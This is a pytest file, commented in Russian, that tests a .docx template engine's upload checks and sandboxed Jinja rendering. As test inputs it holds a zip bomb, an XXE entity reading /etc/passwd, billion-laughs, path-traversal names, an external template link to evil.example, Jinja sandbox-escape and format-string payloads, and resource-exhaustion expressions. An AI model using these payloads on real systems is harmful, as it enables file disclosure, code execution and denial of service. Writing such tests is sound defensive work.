"""Движок шаблонов: проверка загружаемого .docx и безопасный рендер.

Тесты чистые (без БД). Шаблоны собираются фабрикой `make_docx` через python-docx;
опасные варианты пакета - подменой/добавлением частей zip.
"""

import io
import time
import zipfile

import pytest
from docx import Document

from apps.documents import engine
from apps.documents.catalog import sample_context
from apps.documents.errors import DocumentError

KIND = "order_request"
LOOP_ROWS = [
    ["{%tr for c in order.consignments %}", ""],
    ["{{ c.name }}", "{{ c.weight_kg }}"],
    ["{%tr endfor %}", ""],
]


def make_docx(text_or_body="Заказ {{ order.number }}", extra_parts=None, table_rows=None):
    """Собрать .docx: абзацы текста, необязательная таблица, доп./заменённые части zip.

    `text_or_body` - строка (один абзац) или список строк (абзацы).
    `table_rows` - список строк таблицы (списки текстов ячеек).
    `extra_parts` - {имя части: bytes | None}: добавить/заменить часть, None - удалить.
    """
    doc = Document()
    paragraphs = [text_or_body] if isinstance(text_or_body, str) else list(text_or_body)
    for text in paragraphs:
        doc.add_paragraph(text)
    if table_rows:
        table = doc.add_table(rows=len(table_rows), cols=len(table_rows[0]))
        for r, row in enumerate(table_rows):
            for c, text in enumerate(row):
                table.cell(r, c).text = text
    buf = io.BytesIO()
    doc.save(buf)
    data = buf.getvalue()
    if extra_parts:
        data = rewrite_zip(data, extra_parts)
    return data


def rewrite_zip(data, parts):
    src = zipfile.ZipFile(io.BytesIO(data))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as dst:
        for info in src.infolist():
            if info.filename in parts:
                continue
            dst.writestr(info.filename, src.read(info.filename))
        for name, content in parts.items():
            if content is not None:
                dst.writestr(name, content)
    return out.getvalue()


def read_part(data, name):
    return zipfile.ZipFile(io.BytesIO(data)).read(name)


def docx_text(data):
    doc = Document(io.BytesIO(data))
    lines = [p.text for p in doc.paragraphs]
    for table in doc.tables:
        for row in table.rows:
            lines.append(" | ".join(cell.text for cell in row.cells))
    return "\n".join(lines)


def assert_invalid(data, kind=KIND, code="template_invalid"):
    with pytest.raises(DocumentError) as ei:
        engine.validate_upload(data, kind)
    assert ei.value.get_codes() == code
    assert ei.value.status_code == 400
    return str(ei.value.detail)


def assert_render_invalid(data, context=None):
    with pytest.raises(DocumentError) as ei:
        engine.render_docx(data, context if context is not None else sample_context(KIND))
    assert ei.value.get_codes() == "template_invalid"
    return str(ei.value.detail)


def assert_no_internals(message):
    for leak in ("Traceback", "/home", "/tmp", "site-packages", "__", "object at 0x", "File "):
        assert leak not in message, message


# --- обязательные тесты из брифа ---------------------------------------------------------


def test_valid_template_passes():
    engine.validate_upload(make_docx(table_rows=LOOP_ROWS), KIND)


def test_too_large_rejected():
    data = b"x" * (engine.MAX_TEMPLATE_BYTES + 1)
    assert_invalid(data, code="template_too_large")


def test_not_a_zip_rejected():
    assert_invalid(b"hello")


def test_zip_bomb_rejected():
    big = b"\0" * (25 * 1024 * 1024)
    data = make_docx(extra_parts={"word/media/bomb.bin.txt": big})
    assert len(data) < engine.MAX_TEMPLATE_BYTES  # маленький файл, огромная распаковка
    assert_invalid(data)


@pytest.mark.parametrize(
    "part",
    ["word/vbaProject.bin", "word/VBAPROJECT.BIN", "word/embeddings/oleObject1.bin"],
)
def test_macros_rejected(part):
    assert_invalid(make_docx(extra_parts={part: b"\xd0\xcf\x11\xe0macro"}))


def test_external_relationship_rejected():
    data = make_docx()
    rels = read_part(data, "word/_rels/document.xml.rels").decode()
    rels = rels.replace(
        "</Relationships>",
        '<Relationship Id="rIdX" Type="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" '
        'TargetMode="External"/></Relationships>',
    )
    assert_invalid(rewrite_zip(data, {"word/_rels/document.xml.rels": rels.encode()}))


def test_unknown_placeholder_rejected():
    message = assert_invalid(make_docx("Номер {{ order.nope }}"))
    assert "order.nope" in message
    assert_no_internals(message)


def test_unknown_placeholder_in_loop_names_full_path():
    rows = [
        ["{%tr for c in order.consignments %}", ""],
        ["{{ c.nope }}", ""],
        ["{%tr endfor %}", ""],
    ]
    message = assert_invalid(make_docx(table_rows=rows))
    assert "order.consignments[].nope" in message


def test_unknown_root_placeholder_rejected():
    message = assert_invalid(make_docx("{{ nope }}"))
    assert "nope" in message


def test_syntax_error_rejected():
    message = assert_invalid(make_docx(["Первый абзац", "{% for x in %}"]))
    assert "строк" in message
    assert any(ch.isdigit() for ch in message)
    assert_no_internals(message)


@pytest.mark.parametrize(
    "expr",
    [
        "{{ ''.__class__.__mro__ }}",
        "{{ order.number.__class__ }}",
        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        "{{ cycler.__init__.__globals__ }}",
        "{{ joiner.__init__.__globals__ }}",
        "{{ namespace.__init__.__globals__ }}",
        "{{ range.__self__ }}",
        "{{ dict.mro() }}",
        "{{ self._TemplateReference__context }}",
        "{{ self.__init__.__globals__ }}",
        "{{ order['__class__'] }}",
        "{{ (order|attr('__class__')) }}",
        "{{ lipsum.__globals__ }}",
    ],
)
def test_sandbox_blocks_attribute_walk(expr):
    message = assert_invalid(make_docx(expr))
    assert_no_internals(message)
    # и в рабочем рендере - ошибка, а не пустая строка с выполненным кодом
    assert_render_invalid(make_docx(expr))


def test_render_fills_text_and_loop():
    ctx = sample_context(KIND)
    data = engine.render_docx(make_docx("Заказ {{ order.number }}", table_rows=LOOP_ROWS), ctx)
    text = docx_text(data)
    assert f"Заказ {ctx['order']['number']}" in text
    for c in ctx["order"]["consignments"]:
        assert c["name"] in text
        assert c["weight_kg"] in text
    assert "{{" not in text and "{%" not in text


def test_render_missing_optional_is_blank():
    ctx = sample_context(KIND)
    del ctx["order"]["comment"]
    data = engine.render_docx(make_docx("Комментарий:[{{ order.comment }}]"), ctx)
    assert "Комментарий:[]" in docx_text(data)


def test_render_missing_nested_optional_is_blank():
    data = engine.render_docx(make_docx("[{{ order.nope.deeper }}]"), sample_context(KIND))
    assert "[]" in docx_text(data)


def test_render_huge_range_is_bounded():
    started = time.monotonic()
    data = make_docx("{% for i in range(10**9) %}x{% endfor %}")
    assert_invalid(data)
    assert_render_invalid(data)
    assert time.monotonic() - started < 10


# --- пакет: дополнительные угрозы --------------------------------------------------------


XXE = (
    b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    b'<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
    b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    b"<w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>"
)

LAUGHS = (
    b'<?xml version="1.0"?>\n<!DOCTYPE lolz [<!ENTITY lol "lol">'
    b'<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
    b'<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>\n'
    b'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    b"<w:body><w:p><w:r><w:t>&lol3;</w:t></w:r></w:p></w:body></w:document>"
)


@pytest.mark.parametrize("payload", [XXE, LAUGHS], ids=["xxe", "billion-laughs"])
def test_xml_dtd_and_entities_rejected(payload):
    data = make_docx(extra_parts={"word/document.xml": payload})
    message = assert_invalid(data)
    assert "passwd" not in message
    # рабочий рендер тоже перепроверяет пакет и не раскрывает сущности
    message = assert_render_invalid(data)
    assert "root:" not in message


def test_entity_in_other_xml_part_rejected():
    styles = b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "b">]><x/>'
    assert_invalid(make_docx(extra_parts={"word/styles.xml": styles}))


def test_utf16_xml_part_rejected():
    body = '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY a "b">]><x/>'
    assert_invalid(make_docx(extra_parts={"word/styles.xml": body.encode("utf-16")}))


@pytest.mark.parametrize(
    "name",
    ["../evil.xml", "word/../../evil.xml", "/etc/evil.xml", "C:/evil.xml", "word\\evil.xml"],
)
def test_path_traversal_member_rejected(name):
    assert_invalid(make_docx(extra_parts={name: b"<x/>"}))


def test_duplicate_member_rejected():
    data = make_docx()
    out = io.BytesIO(data)
    with zipfile.ZipFile(out, "a") as zf:
        import warnings

        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            zf.writestr("word/document.xml", b"<x/>")
    assert_invalid(out.getvalue())


def test_encrypted_member_rejected():
    data = bytearray(make_docx())
    zf = zipfile.ZipFile(io.BytesIO(bytes(data)))
    info = zf.getinfo("word/document.xml")
    # бит 0 флагов "зашифровано" в локальном заголовке и в центральном каталоге
    data[info.header_offset + 6] |= 0x01
    cd = bytes(data).find(b"PK\x01\x02")
    while cd != -1:
        name_len = int.from_bytes(data[cd + 28 : cd + 30], "little")
        if bytes(data[cd + 46 : cd + 46 + name_len]) == b"word/document.xml":
            data[cd + 8] |= 0x01
            break
        cd = bytes(data).find(b"PK\x01\x02", cd + 4)
    assert zipfile.ZipFile(io.BytesIO(bytes(data))).getinfo("word/document.xml").flag_bits & 1
    assert_invalid(bytes(data))


def test_too_many_entries_rejected():
    parts = {f"word/media/f{i}.txt": b"" for i in range(engine.MAX_ZIP_ENTRIES + 1)}
    assert_invalid(make_docx(extra_parts=parts))


@pytest.mark.parametrize("missing", ["[Content_Types].xml", "word/document.xml"])
def test_missing_required_part_rejected(missing):
    assert_invalid(make_docx(extra_parts={missing: None}))


def test_macro_enabled_content_type_rejected():
    data = make_docx()
    ct = read_part(data, "[Content_Types].xml").decode()
    ct = ct.replace(
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
        "application/vnd.ms-word.document.macroEnabled.main+xml",
    )
    assert "macroEnabled" in ct
    assert_invalid(rewrite_zip(data, {"[Content_Types].xml": ct.encode()}))


# --- песочница Jinja: дополнительные угрозы -----------------------------------------------


@pytest.mark.parametrize(
    "expr",
    [
        "{% include 'x.xml' %}",
        "{% import 'x.xml' as x %}",
        "{% from 'x.xml' import y %}",
        "{% extends 'x.xml' %}",
    ],
)
def test_include_import_extends_rejected(expr):
    message = assert_invalid(make_docx(expr))
    assert_no_internals(message)
    assert_render_invalid(make_docx(expr))


@pytest.mark.parametrize(
    "expr",
    [
        "{{ '{0.__class__}'.format(order.number) }}",
        "{{ '{0.__class__.__mro__}'.format_map({'0': 1}) }}",
        "{{ '{x.__init__.__globals__}'.format(x=cycler) }}",
    ],
)
def test_format_string_attack_blocked(expr):
    message = assert_invalid(make_docx(expr))
    assert_no_internals(message)
    assert_render_invalid(make_docx(expr))


def test_config_and_self_do_not_leak():
    # {{ config }} - неизвестная метка, а не настройки сервера
    message = assert_invalid(make_docx("{{ config }}"))
    assert "config" in message
    data = engine.render_docx(make_docx("[{{ config }}][{{ config.SECRET_KEY }}]"), {})
    assert "[][]" in docx_text(data)


def test_nested_loop_blowup_bounded():
    started = time.monotonic()
    data = make_docx(
        "{% for i in range(100000) %}{% for j in range(100000) %}{% endfor %}{% endfor %}"
    )
    message = assert_invalid(data)
    assert_no_internals(message)
    assert time.monotonic() - started < 10


def test_recursive_macro_blowup_bounded():
    started = time.monotonic()
    data = make_docx(
        "{% macro f(n) %}{% if n %}{{ f(n - 1) }}{{ f(n - 1) }}{% endif %}{% endmacro %}{{ f(60) }}"
    )
    assert_invalid(data)
    assert time.monotonic() - started < 10


@pytest.mark.parametrize(
    "expr",
    [
        "{{ 'x' * 100000000 }}",
        "{{ ['x'] * 100000000 }}",
        "{{ 'x'.center(100000000) }}",
        "{{ 'x'.zfill(100000000) }}",
        "{{ 'x'|center(100000000) }}",
        "{{ 'x'|indent(100000000, true) }}",
        "{{ [1]|batch(100000000, 'x')|list }}",
        "{{ '{:>100000000}'.format(1) }}",
        "{{ '%100000000d' % 1 }}",
        "{{ '%100000000d'|format(1) }}",
        "{{ 10 ** 100000000 }}",
        (
            "{% set ns = namespace(s='xxxxxxxxxx') %}{% for i in range(60) %}"
            "{% set ns.s = ns.s ~ ns.s %}{% endfor %}{{ ns.s|length }}"
        ),
        (
            "{% set ns = namespace(s='xxxxxxxxxx') %}{% for i in range(60) %}"
            "{% set ns.s = ns.s + ns.s %}{% endfor %}{{ ns.s|length }}"
        ),
        (
            "{% set ns = namespace(n=2) %}{% for i in range(60) %}"
            "{% set ns.n = ns.n * ns.n %}{% endfor %}{{ ns.n > 0 }}"
        ),
        "{% for i in range(100000) %}{{ 'x' * 1000 }}{% endfor %}",
        "{{ ('x' * 99999).join(['a'] * 99999) }}",
        "{{ (['a'] * 99999)|join('x' * 99999) }}",
        "{{ ('a' * 99999).replace('', 'x' * 99999) }}",
        "{{ ('a' * 99999)|replace('a', 'x' * 99999) }}",
        "{{ ('\\t' * 99999).expandtabs(99999) }}",
        "{{ ('\\n' * 99999)|indent(99999, true) }}",
        "{{ ('x ' * 99999)|wordwrap(1, wrapstring='y' * 99999) }}",
        (
            "{% set ns = namespace(l=[1]) %}{% for i in range(40) %}"
            "{% set ns.l = [ns.l, ns.l] %}{% endfor %}{{ ns.l }}"
        ),
    ],
)
def test_amplification_bounded(expr):
    started = time.monotonic()
    message = assert_invalid(make_docx(expr))
    assert_no_internals(message)
    assert "Синтаксическая" not in message and "Неизвестная" not in message
    assert time.monotonic() - started < 10


def test_lipsum_global_removed():
    data = make_docx("{{ lipsum(100000) }}")
    assert "lipsum" in assert_invalid(data)
    assert_render_invalid(data)


def test_heavy_single_operation_stopped_by_process_limits():
    # одна тяжёлая C-операция (json с огромным отступом) не ловится бюджетами шагов -
    # её останавливает лимит памяти/времени дочернего процесса
    started = time.monotonic()
    message = assert_invalid(make_docx("{{ ([[]] * 99999)|tojson(indent=99999) }}"))
    assert_no_internals(message)
    assert time.monotonic() - started < engine.RENDER_TIMEOUT_SECONDS + 5


def test_render_prints_whole_list_rejected():
    message = assert_render_invalid(make_docx("{{ order.consignments }}"))
    assert "цикл" in message


def test_rendered_xml_cannot_inject_doctype():
    # автор шаблона может вывести "сырой" XML через |safe - но не DTD/сущности
    expr = "{{ ('%c'|format(60) ~ '!DOCTYPE x [' ~ '%c'|format(60) ~ '!ENTITY a \"b\">]>')|safe }}"
    message = assert_invalid(make_docx(expr))
    assert_no_internals(message)


def test_render_escapes_xml_special_chars():
    ctx = sample_context(KIND)
    ctx["order"]["comment"] = 'A & B <c> "d"'
    data = engine.render_docx(make_docx("{{ order.comment }}"), ctx)
    assert 'A & B <c> "d"' in docx_text(data)


def test_dict_keys_win_over_dict_methods():
    rows = [
        ["{%tr for it in invoice.items %}", ""],
        ["{{ it.title }}", "{{ it.amount_net }}"],
        ["{%tr endfor %}", ""],
    ]
    data = make_docx(table_rows=rows)
    engine.validate_upload(data, "invoice_print")
    ctx = sample_context("invoice_print")
    text = docx_text(engine.render_docx(data, ctx))
    for item in ctx["invoice"]["items"]:
        assert item["title"] in text


def test_render_rejects_structurally_bad_package():
    data = make_docx(extra_parts={"word/vbaProject.bin": b"macro"})
    assert_render_invalid(data)


# --- изоляция рендера в дочернем процессе --------------------------------------------------


def test_isolation_timeout_kills_child(monkeypatch):
    monkeypatch.setattr(engine, "RENDER_TIMEOUT_SECONDS", 1)
    started = time.monotonic()
    with pytest.raises(DocumentError) as ei:
        engine._isolated(time.sleep, 30)
    assert ei.value.get_codes() == "template_invalid"
    assert time.monotonic() - started < 8


def test_isolation_memory_limit():
    with pytest.raises(DocumentError) as ei:
        engine._isolated(bytearray, 4 * 1024 * 1024 * 1024)
    assert ei.value.get_codes() == "template_invalid"


def test_isolation_passes_document_error_and_result():
    def boom():
        raise DocumentError("template_invalid", "Проверка")

    with pytest.raises(DocumentError) as ei:
        engine._isolated(boom)
    assert str(ei.value.detail) == "Проверка"
    assert engine._isolated(bytes, 3) == b"\0\0\0"
